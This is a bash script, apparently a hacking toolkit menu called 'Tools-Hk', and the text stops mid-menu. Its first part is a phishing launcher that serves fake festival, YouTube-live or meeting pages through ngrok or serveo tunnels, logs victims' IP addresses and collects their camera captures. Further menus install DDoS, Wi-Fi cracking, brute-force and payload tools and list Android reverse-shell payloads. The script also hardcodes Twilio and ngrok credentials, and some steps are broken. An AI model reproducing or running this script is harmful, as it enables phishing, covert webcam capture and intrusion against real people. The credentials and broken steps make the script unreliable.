#!/bin/bash

clear
green='\e[1;31m'
green='\e[1;32m' 
blue='\e[1;34m' 
purple='\e[1;35m'
cyan='\e[1;36m' 
white='\e[1;37m'
yellow='\e[1;33m'

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html

}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
head
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
cat  ~/.ngrok2/ngrok.yml
read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Back\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 1 ]]; then
ngrok_server

#clear
#bash Tools-Hk.sh
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
camphish

fi


}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}




#############################################
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $green"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $green"[*] Stopping Services... "
apache_svc_stop
postgresql_stop
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using Tools-Hk  :)"
exit
}

ppppp () {

echo -e $green     '{ -10- } ===> '$green " Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) "
echo -e $green     '{ -11- } ===> '$white " Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
}
#function lhost
function get_lhost() 
{
  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
}
#function lport
function get_lport() 
{
  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
}

#function payload
function get_payload()
{
  PAYLOAD=$(zenity --list --title "☢ Tools-Hk ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
}
function get_payload1()
{
  PAYLOAD=$(zenity --list --title "☢ Tools-Hk ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
}
#function name
function payload_name()
{
 apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
}
sms () {
rm -rif sms.py
touch sms.py
echo 'from twilio.rest import Client' >> sms.py
#echo 'account_sid = 'ACe5063b7f526514972e285c82fda368cd'' >> $HOME/Building-Distro/sms.py
echo "account_sid = 'ACacd13e6e908f06746c24faf1b151d48c'" >> sms.py
echo "auth_token = '5253dbb724b31a8af71a669948c26fa8'" >> sms.py
echo "client = Client(account_sid, auth_token)" >> sms.py
#echo 'auth_token = '7a4462ded5843d79bf8f8778e00e2a44'' >> $HOME/Building-Distro/sms.py
echo 'message = client.messages \' >> sms.py
echo '.create(' >> sms.py
read -p "insert Your msg to Devloper ex : 'Hello Dev.Mohammed', " msg
echo "body="$msg >> sms.py
echo "messaging_service_sid='MG0099696877275797e58b24a27ba9b1f1'," >> sms.py
echo "from_='+15017122661'," >> sms.py
echo "status_callback='http://postb.in/1234abcd'," >> sms.py
echo "to='+967733014747'," >> sms.py
echo ')' >> sms.py
echo 'print(message.sid)' >> sms.py
python sms.py

}
meta () {

figlet "metasploit"
cd ~
apt install git wget curl
apt install -y util-linux;apt install figlet

termux-setup-storage
apt install unstable-repo -y
apt install metasploit -y

echo -e $green "Done....."
echo -e $green "Type 'msfconsole' to start."
msfconsole
}
head1 () {
echo ''
echo ''
toilet -f term -F border --gay "fb : www.fb.com/mohammedinf0 "
sleep 0.3
echo -e $green
#figlet -f smmono9 "Tools-Hk" 
bash banner2
sleep 0.5
echo -e $green
echo -e $green"-------------------------------------------"
sleep 0
echo -e $green"--------------$yellow(3 in 1) ---------------"
sleep 0
echo -e $yellow "By =====> $green HACKER / MOHAMMED Info <====="
sleep 0
echo ''
}


head () {
echo -e $green
#oilet -fecho -e $green
#iglet -f smmono9 "Tools-Hk"nn
#sleep 0.3
#echo -e $white '############## term -F border --gay "fb : www.fb.com/profionaldhim "
toilet -f term -F border --gay "fb : www.fb.com/mohammedinf0 "
echo -e $green
sleep 0.3
bash banner
#cat head2
echo -e $yellow


}

head
echo -e $green   '{ -1- } ===> ' $white " Tools-Gnuroot & kali linux"
echo ""
sleep 0
echo -e $green   '{ -2- } ===> ' $green " Tools-Termux"
echo ""
sleep 0
echo -e $green   '{ -3- } ===> ' $white " Use automatic Tools "
echo ""
sleep 0
echo -e $green   '{ -4- } ===> ' $green " Repair Termux & Kali Linux"
echo ""
sleep 0
echo -e $green   '{ -5- } ===> ' $white " Encrypt Your Tools"
echo ""
sleep 0
#echo -e $green   '{ -6- } ===> ' $green " Update "
echo ""
sleep 0
echo -e $green   "0- EXIT |-|"
echo "" 
echo "" 
sleep 0
echo -e $green "Enter The Number:" 
echo -e $green
sleep 0
###################################
read -p " insert : " name
if [ $name = 7 ]
then
hash -r && wget https://raw.githubusercontent.com/profionaldhim/Tools-Hk/master/Tools-Hk.sh
fi
if [ $name = 1 ]
then 
clear
head
echo -e $green "Gnuroot"
echo ""
echo -e $green '{ -1- } ===> ' $white " DDOS Attack"
echo ""
echo -e $green '{ -2- } ===> ' $green " Sniffing" 
echo "" 
echo -e $green '{ -3- } ===> ' $white " Wifi Hack"
echo ""
echo -e $green '{ -4- } ===> ' $green " webSite Hack"
echo ""
echo -e $green '{ -5- } ===> ' $white " Accounts Hack"
echo ""
echo -e $green '{ -6- } ===> ' $green " creat Backup"
echo ""
echo -e $green '{ -7- } ===> ' $white " injection payload"
echo ""
echo -e $green '{ -8- } ===> ' $green " other"
echo ""
echo -e $green "00- back" 
echo "" 
echo "" 
echo -e $green "Enter The Number:"
echo -e $green
read -p " insert : " Gnuroot
if [ $Gnuroot = 1 ]
then
clear
head
echo -e $green "DDOS Attack"
echo ""
echo -e $green '{ -1- } ===> ' $white " Slowloris"
echo ""
echo -e $green '{ -2- } ===> ' $green " Hammer"
echo ""
echo -e $green '{ -3- } ===> ' $white " Metasploit"
echo ""
echo -e $green "00- Back"
read -p " insert : " Ddos
if [ $Ddos = 1 ]
then
clear
echo -e $green
figlet "Slowloris"
cd ~
git clone https://github.com/gkbrk/slowloris.git
bash Tools-Hk.sh
fi
if [ $Ddos = 2 ]
then
clear
echo -e $green
figlet "Hammer"
cd ~
git clone https://github.com/cyweb/hammer.git
bash Tools-Hk.sh
fi
if [ $Ddos = 4 ]
then
clear
echo -e $green
figlet "Metasploit-FrameWork"
cd ~
apt-get install curl
adduser m-info
123456
su m-info
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb 
>msfinstall && \
chmod 755 msfinstall && \ 
./msfinstall
bash Tools-Hk.sh
fi
if [ $Ddos = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 2 ]
then
clear
head
echo -e $green "Sniffing"
echo ""
echo -e $green '{ -1- } ===> ' $white " Websploit"
echo ""
echo -e $green '{ -2- } ===> ' $green " Routersploit"
echo ""
echo -e $green '{ -3- } ===> ' $white " Metasploit"
echo ""
echo -e $green "00- Back"
read -p " insert : " sniffing
if [ $sniffing = 1 ]
then
clear
echo -e $green
figlet "Websploit"
cd ~
apt install python2 
pip  install requests
git clone https://github.com/m4ll0k/wpsploit
bash Tools-Hk.sh
fi
if [ $sniffing = 2 ]
then
clear
echo -e $green
figlet "Routersploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $sniffing = 3 ]
then
clear
echo -e $green
figlet "Metasploit-FrameWork"
cd ~
apt-get install curl
adduser m-info
123456
su m-info
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb 
>msfinstall && \
chmod 755 msfinstall && \ 
./msfinstall
bash Tools-Hk.sh
fi
if [ $sniffing = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 3 ]
then
clear
head
echo -e $green "Wifi Hack"
echo ""
echo -e $green '{ -1- } ===> ' $white " Wifite"
echo ""
echo -e $green '{ -2- } ===> ' $green " aircrack-ng"
echo ""
echo -e $green '{ -3- } ===> ' $white " HT-WPS-Breaker"
echo ""
echo -e $green '{ -4- } ===> ' $green " fluxion"
echo ""
echo -e $green '{ -5- } ===> ' $white " Routersploit"
echo ""
echo -e $green '{ -6- } ===> ' $green " airgeddon"
echo ""
echo -e $green '{ -7- } ===> ' $green " crunch(list password)"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " wifi
if [ $wifi = 1 ]
then
clear
echo -e $green
figlet "wifite"
cd ~
apt-get install wifite
bash Tools-Hk.sh
fi
if [ $wifi = 2 ]
then
clear
echo -e $green
figlet "aircrack-ng"
cd ~
apt-get install aircrack-ng
bash Tools-Hk.sh
fi
if [ $wifi = 3 ]
then
clear
echo -e $green
figlet "HT-WPS-Breaker"
cd ~
git clone https://github.com/SilentGhostX/HT-WPS-Breaker
bash Tools-Hk.sh
fi
if [ $wifi = 4 ]
then
clear
echo -e $green
figlet "fluxion"
cd ~ 
git clone https://github.com/facebook/flux.git
bash Tools-Hk.sh
fi
if [ $wifi = 5 ]
then
clear
echo -e $green
figlet "Routersploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $wifi = 6 ]
then
clear
echo -e $green
figlet "airgeddon"
cd ~
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
bash Tools-Hk.sh
fi
if [ $wifi = 7 ]
then
clear
echo -e $green
figlet " To creat wordlist"
cd ~
apt-get install crunch -y
bash Tools-Hk.sh
fi
if [ $wifi = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 4 ]
then
clear
head
echo -e $green "WebSite Hack"
echo ""
echo -e $green '{ -1- } ===> ' $white " Sqlmap"
echo ""
echo -e $green '{ -2- } ===> ' $green " webscan"
echo ""
echo -e $green '{ -3- } ===> ' $white " tor"
echo ""
echo -e $green '{ -4- } ===> ' $green " scriptux"
echo ""
echo -e $green '{ -5- } ===> ' $white " Sitebroker"
echo ""
echo -e $green '{ -6- } ===> ' $green " nmap"
echo ""
echo -e $green '{ -7- } ===> ' $white " Devploit"
echo ""
echo -e $green '{ -8- } ===> ' $green " Iplocator"
echo ""
echo -e $green '{ -9- } ===> ' $white " sniper-h"
echo ""
echo -e $green '{ -10- } ===> ' $green " hash-identifier"
echo ""
echo -e $green '{ -11- } ===> ' $white " dirsearch"
echo ""
echo -e $green '{ -12- } ===> ' $green " Google-Dork-Scan"
echo ""
echo -e $green '{ -13- } ===> ' $white " zenmap"
echo ""
echo -e $green "00- Back"
read -p " insert : " website
if [ $website = 1 ]
then
clear
echo -e $green
figlet "Sqlmap"
cd ~
git clone https://github.com/sqlmapproject/sqlmap
bash Tools-Hk.sh
fi
if [ $website = 2 ]
then
clear
echo -e $green
figlet "webscan"
cd ~
git clone https://github.com/kost/docker-webscan
bash Tools-Hk.sh
fi
if [ $website = 3 ]
then
clear
echo -e $green
figlet "tor"
cd ~
apt-get install tor -y
fi
if [ $website = 4 ]
then
clear
echo -e $green
figlet "scriptux"
cd ~
git clone https://github.com/Gameye98/Scriptux
bash Tools-Hk.sh
fi
if [ $website = 5 ]
then
clear
echo -e $green
figlet "sitebroker"
cd ~
git clone https://github.com/Anon-Exploiter/SiteBroker
bash Tools-Hk.sh
fi
if [ $website = 6 ]
then
clear
echo -e $green
figlet "nmap"
apt install nmap
fi
if [ $website = 7 ]
then
clear
echo -e $green
figlet "Devploit"
git clone https://github.com/joker25000/Devploit
bash Tools-Hk.sh
fi
if [ $website = 8 ]
then
clear
echo -e $green
figlet "IPlocator"
cd ~
git clone https://github.com/AndreasBriese/ipLocator
bash Tools-Hk.sh
fi
if [ $website = 9 ]
then
clear
echo -e $green
figlet "sniper-h"
git clone https://github.com/laser010/sniper-h
bash Tools-Hk.sh
fi
if [ $website = 10 ]
then
clear
echo -e $green
figlet "hash-identifier"
git clone https://github.com/Miserlou/Hash-Identifier
bash Tools-Hk.sh
fi
if [ $website = 11 ]
then
clear
echo -e $green
figlet "dirsearch"
cd ~
git clone https://github.com/maurosoria/dirsearch
fi
if [ $website = 12 ]
then
clear
echo -e $green
figlet "Google-Dork-Scan"
cd ~
git clone https://github.com/ReiGelado/Google-Dork-Scan
bash Tools-Hk.sh
fi
if [ $website = 13 ]
then
clear
echo -e $green
figlet "zenmap"
cd ~
apt-get install zenmap
bash Tools-Hk.sh
fi
if [ $website = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 5 ]
then
clear
head
echo -e $green "Account Hack"
echo ""
echo -e $green '{ -1- } ===> ' $white " hydra"
echo ""
echo -e $green '{ -2- } ===> ' $green " crunch(list password)"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " account_Hack
if [ $account_Hack = 1 ]
then
clear
echo -e $green
figlet "hydra"
cd ~
apt-get install hydra
bash Tools-Hk.sh
fi
if [ $account_Hack = 2 ]
then
clear
echo -e $green
figlet "crunch"
cd ~
apt-get install crunch
bash Tools-Hk.sh
fi
if [ $account_Hack = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 6 ]
then
clear
head
echo -e $green "Backup / Recovery"
echo ""
echo -e $green '{ -1- } ===> ' $white " Backup"
echo ""
echo -e $green '{ -2- } ===> ' $green " Recovery"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " backup_recovery
if [ $backup_recovery = 1 ]
then
clear
echo -e $green
figlet "backup"
cd ~
apt update && apt upgrade
cd /data/data/com.gnuroot.debian/
tar -cvzf /sdcard/buckup-gnuroot.tgz app_HOME cache databases debian files lib support shagreen_prefs
fi
if [ $backup_recovery = 2 ]
then
clear
echo -e $green
figlet "Recovery"
cd ~
apt update && apt upgrade
cd /data/data/com.gnuroot.debian/
tar -xvzf /sdcard/buckup-gnuroot.tgz
bash Tools-Hk.sh
fi
if [ $backup_recovery = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 00 ]
then
clear
bash Tools-Hk.sh
fi
if [ $Gnuroot = 7 ]
then
clear
head
echo -e $green   "PAYLOAD"
echo ""
echo -e $green '{ -1- } ===> ' $white " Venom"
echo ""
echo -e $green '{ -2- } ===> ' $green " PAYMAX"
echo ""
echo -e $green '{ -3- } ===> ' $white " txtool"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " payload2
if [ $payload2 = 1 ]
then
clear
echo -e $green
figlet "venom"
cd ~
git clone https://github.com/r00t-3xp10it/venom 
bash Tools-Hk.sh
fi
if [ $payload2 = 2 ]
then
clear
echo -e $green
figlet "PAYMAX"
cd ~
git clone https://github.com/Matrix07ksa/PAYMAX
bash Tools-Hk.sh
fi
if [ $payload2 = 3 ]
then
clear
echo -e $green
figlet "Txtool"
cd ~
git clone https://github.com/kuburan/txtool
bash Tools-Hk.sh
fi
if [ $payload2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $Gnuroot = 8 ]
then
clear
head
echo -e $green   "Other"
echo ""
echo -e $green '{ -1- } ===> ' $white " spammer-Grab"
echo ""
echo -e $green '{ -2- } ===> ' $green " Ngrok"
echo ""
echo -e $green '{ -3- } ===> ' $white " change style"
echo ""
echo -e $green '{ -4- } ===> ' $green " style lxde"
echo ""
echo -e $green '{ -5- } ===> ' $white " wireshark"
echo ""
echo -e $green '{ -6- } ===> ' $green " nano"
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " other
if [ $other = 1 ]
then
clear
echo -e $green
figlet "spammer-Grab"
cd ~
cd $Home
git clone https://github.com/profionaldhim/Spammer-Grab
cd Spammer-Grab 
mv Spammer-Grab.zip $HOME
cd $Home
rm -rif Spammer-Grab
unzip Spammer-Grab.zip
cd Spammer-Grab
chmod +x spammer.py 

bash Tools-Hk.sh
fi
if [ $other = 2 ]
then
clear
echo -e $green
figlet "Ngrok"
cd $Home
mv Tools-Hk/ngrok-stable-linux-arm.zip $HOME
apt install unzip -y
unzip ngrok-stable-linux-arm.zip
rm -rif ngrok-stable-linux-arm.zip
cd ngrok-stable-linux-arm
chmod +x ngrok
./ngrok authtoken 7VJwGkCTTUubiGhgz6Gv6_5fMLganRSKj9ntdefnF5o
bash Tools-Hk.sh
fi
if [ $other = 3 ]
then
clear
echo -e $green
figlet "change stayle"
cd $HOME
apt install figlet -y
apt install toilet -y
gem install lolcat
#git clone https://github.com/profionaldhim/etc/blob/master/bash.bashrc
mv Tools-Hk/bash.bashrc $PREFIX/etc
cd $PREFIX/etc
rm -rif motd
bash Tools-Hk.sh
fi
if [ $other = 4 ]
then
clear
echo -e $green
figlet "lxde"
cd ~
apt-get install xterm
apt-get install lxde 
bash Tools-Hk.sh
fi
if [ $other = 5 ]
then
clear
echo -e $green
figlet "wireshark"
cd ~
apt-get install wireshark
bash Tools-Hk.sh
fi
if [ $other = 6 ]
then
clear
echo -e $green
figlet "nano"
cd ~
apt-get install nano -y
fi
if [ $other = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
fi
if [ $name = 2 ]
then
clear
head
echo -e $green "Termux"
echo ""
echo -e $green '{ -1- } ===> ' $white " DDOS Attack"
echo ""
echo -e $green '{ -2- } ===> ' $green " Sniffing"
echo ""
echo -e $green '{ -3- } ===> ' $white " Wifi Hack"
echo ""
echo -e $green '{ -4- } ===> ' $green " webSite Hack"
echo ""
echo -e $green '{ -5- } ===> ' $white " Accounts Hack"
echo ""
echo -e $green '{ -6- } ===> ' $green " creat Backup"
echo ""
echo -e $green '{ -7- } ===> ' $white " injection payload"
echo ""
echo -e $green '{ -8- } ===> ' $green " other"
echo ""
echo -e $green "00- back"
echo ""
read -p " insert : " termux
if [ $termux = 1 ]
then
clear
head
echo -e $green "DDOS Attack"
echo ""
echo -e $green '{ -1- } ===> ' $white " Slowloris"
echo ""
echo -e $green '{ -2- } ===> ' $green " Hammer"
echo ""
echo -e $green '{ -3- } ===> ' $white " Metasploit"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " ddos_termux
if [ $ddos_termux = 1 ]
then
clear
echo -e $green
figlet "slowloris"
cd ~
git clone https://github.com/gkbrk/slowloris.git
fi
if [ $ddos_termux = 2 ]
then
clear
echo -e $green
figlet "Hammer"
cd ~
git clone https://github.com/cyweb/hammer.git
fi
if [ $ddos_termux = 3 ]
then
clear
echo -e $green
figlet "metasploit"
cd ~
apt install git wget curl
apt install -y util-linux;apt install figlet

termux-setup-storage
apt install unstable-repo -y
apt install metasploit -y

echo -e $green "Done....."
echo -e $green "Type 'msfconsole' to start."
msfconsole
fi

if [ $ddos_termux = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 2 ]
then
clear
head
echo -e $green "Sniffing"
echo ""
echo -e $green '{ -1- } ===> ' $white " Websploit"
echo ""
echo -e $green '{ -2- } ===> ' $green " Routersploit"
echo ""
echo -e $green '{ -3- } ===> ' $white " Metasploit"
echo ""
echo -e $green '{ -4- } ===> ' $green " BeEF"
echo ""
echo -e $green "00- Back"
read -p " insert : " ter_sniffing
if [ $ter_sniffing = 1 ]
then
clear
echo -e $green
figlet "Websploit"
cd ~
pkg install python2
pip2  install requests
git clone https://github.com/websploit/websploit
bash Tools-Hk.sh
fi
if [ $ter_sniffing = 2 ]
then
clear
echo -e $green
figlet "Routersploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $ter_sniffing = 3 ]
then
clear

